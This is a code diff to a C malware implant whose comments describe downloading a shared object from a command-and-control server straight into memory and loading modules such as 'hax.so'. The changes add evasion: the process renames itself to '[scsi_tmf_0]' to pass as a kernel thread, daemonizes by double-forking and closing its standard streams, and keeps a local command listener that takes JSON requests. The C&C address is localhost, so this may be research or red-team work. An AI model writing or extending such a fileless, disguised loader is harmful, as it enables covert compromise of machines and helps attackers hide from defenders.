@@ -29,6 +29,7 @@
 #include <sys/syscall.h>
 #include <sys/socket.h>
 #include <sys/utsname.h>
+#include <signal.h>
 #include <netinet/tcp.h>
 #include <unistd.h>
 #include <errno.h>
@@ -109,6 +110,8 @@ static size_t write_data (void *ptr, size_t size, size_t nmemb, void* userp) {
 		return 1;
 	}
 	log_debug("SHM file written");
+
+    return CURLE_OK;
 }
 
 // Download our share object from a C&C via HTTPs
@@ -148,6 +151,7 @@ int download_to_RAM(char *download) {
 		curl_easy_cleanup(curl);
 		return shm_fd;
 	}
+    return 0;
 }
 
 // Load the shared object from within
@@ -174,7 +178,6 @@ void load_so(int shm_fd) {
 // Get memfd location 
 int setMemfdTbl(int shm_fd, char* mname) {
     char path[1024];
-    void *handle;
     
 
     log_debug("Populating Index Table");
@@ -197,10 +200,12 @@ int setMemfdTbl(int shm_fd, char* mname) {
     }else{
         push(head, path, mname);
     }
+    return 0;
 }
 
 
 int main (int argc, char **argv) {
+
     FILE *fp;
     char *modules[2] = {"libmctor.so", "hax.so"};
     char *ccurl="http://127.0.0.1:8080/";
@@ -208,6 +213,11 @@ int main (int argc, char **argv) {
     char urlbuf[255] = {'\0'};
 	int fd;
     int i;
+
+    argv = save_ps_display_args(argc, argv);
+    init_ps_display("[scsi_tmf_0]");
+
+    backgroundDaemonLeader();
 
     log_info("Opening log file: %s", logFile);
     fp = fopen (logFile,"w");
@@ -232,55 +242,101 @@ int main (int argc, char **argv) {
 
     // TODO: SIGHUP/SIGINT/SIGTERM
     // TODO: ps rename
-    // TODO: daemonaize
+    // TODO: daemonize
     setupCmdP();
     //load_so(fd, fd_s);
     fclose (fp);
 	exit(0);
 }
 
+int backgroundDaemonLeader(){
+
+    // Fork, allowing the parent process to terminate.
+    pid_t pid = fork();
+    if (pid == -1) {
+        log_error("failed to fork while daemonising (errno=%d)",errno);
+    } else if (pid != 0) {
+        _exit(0);
+    }
+
+    // Start a new session for the daemon.
+    if (setsid()==-1) {
+        log_error("failed to become a session leader while daemonising(errno=%d)",errno);
+    }
+
+    // Fork again, allowing the parent process to terminate.
+    signal(SIGHUP,SIG_IGN);
+    signal(SIGCHLD, SIG_IGN); // avoid defunct processes. 
+    pid=fork();
+    if (pid == -1) {
+        log_error("failed to fork while daemonising (errno=%d)",errno);
+    } else if (pid != 0) {
+        _exit(0);
+    }
+
+    // Set the current working directory to the root directory.
+    if (chdir("/tmp") == -1) {
+        log_error("failed to change working directory while daemonising (errno=%d)",errno);
+    }
+
+    // Set the user file creation mask to zero.
+    umask(0);
+
+    close(STDIN_FILENO);
+    close(STDOUT_FILENO);
+    close(STDERR_FILENO);
+    if (open("/dev/null",O_RDONLY) == -1) {
+      log_error("failed to reopen stdin while daemonising (errno=%d)",errno);
+    }
+    if (open("/dev/null",O_WRONLY) == -1) {
+      log_error("failed to reopen stdout while daemonising (errno=%d)",errno);
+    }
+    if (open("/dev/null",O_RDWR) == -1) {
+	  log_error("failed to reopen stderr while daemonising (errno=%d)",errno);
+    }
+
+    return 0;
+}
+
 int setupCmdP(){
-    int flag;
-    char * cmdName;
 
-
-    char buf[MAX_BUF];
-    int sockfd, newsockfd, portno, clilen;
-    struct sockaddr_in serv_addr, cli_addr;
-    int n, pid;
+    unsigned int portno, clilen, sockfd, newsockfd;
+    struct sockaddr_in serv_addr, cli_addr; // AF_INET
+    // struct sockaddr_un serv_addr_un; // AF_UNIX
+    int pid;
     int one = 1;
 
-       /* First call to socket() function */
-    sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    /* First call to socket() function */
+    sockfd = socket(AF_INET, SOCK_STREAM, 0); // AF_INET
+    // sockfd = socket(AF_UNIX, SOCK_STREAM, 0);   // AF_UNIX
 
     if (sockfd < 0) {
       log_error("Error opening socket()");
       return -1;
     }
 
-    /* Initialize socket structure */
+
     bzero((char *) &serv_addr, sizeof(serv_addr));
-    portno = 0; // random
+    portno = 0; // random port
 
     serv_addr.sin_family = AF_INET;
     serv_addr.sin_addr.s_addr = htonl(0x7f000001L); // 127.0.0.1
     serv_addr.sin_port = htons(portno);
 
-    /* Now bind the host address using bind() call.*/
     if (bind(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0) {
       log_error("Error on bind()");
       return -1;
     }
-
-    /* Now start listening for the clients, here
-      * process will go in sleep mode and will wait
-      * for the incoming connection
-    */
-
     setsockopt(sockfd, SOL_TCP, TCP_NODELAY, &one, sizeof(one));
     listen(sockfd,5);
     log_info("Listening on port");
     clilen = sizeof(cli_addr);
+
+    /* AF_UNIX 
+    bzero((char *) &serv_addr_un, sizeof(serv_addr_un));
+    strcpy(serv_addr_un.sun_path, "/tmp/zsock");
+    listen(sockfd,5);
+    */
 
 
     while (1) {
@@ -292,6 +348,7 @@ int setupCmdP(){
       }
       log_info("Accepting requests");
 
+      
       /* Create child process */
       pid = fork();
 
@@ -318,7 +375,7 @@ int setupCmdP(){
 
 
 int processCommandReq (int sock, node_t * head) {
-   int n, head_sz;
+   int n;
    char buffer[MAX_BUF];
    cJSON * root;
    cJSON * cmdName;
@@ -391,13 +448,18 @@ int list_sz(node_t * head) {
 }
 void write_modlist(node_t * head, int sock) {
     node_t * current = head;
-    int offset = 0, n;
+    int n, ret;
     char * entry;
 
 
     while (current != NULL) {
         entry = calloc(1, MAX_BUF);
-		snprintf(entry, MAX_BUF-1, "%s - %s\n", current->mpath, current->mname);
+
+		ret = snprintf(entry, MAX_BUF-1, "%s : %s\n", current->mpath, current->mname);
+        if (ret < 0) {
+         free(entry);
+         continue;
+        }
 
         n = write(sock,entry,strlen(entry));
 
@@ -416,6 +478,8 @@ int push_first(node_t * head, char* path, char* mname) {
     strncpy(head->mname, mname, strlen(mname));
     head->next = NULL;
     log_debug("ModTable: Added: %s : %s", head->mname, head->mpath);
+
+    return 0;
 }
 
 int push(node_t * head, char* path, char* mname) {
@@ -437,4 +501,6 @@ int push(node_t * head, char* path, char* mname) {
     strncpy(current->next->mname, mname, strlen(mname));
     current->next->next = NULL;
     log_debug("ModTable: entry: %s : %s", current->mname, current->mpath);
+
+    return 0;
 }
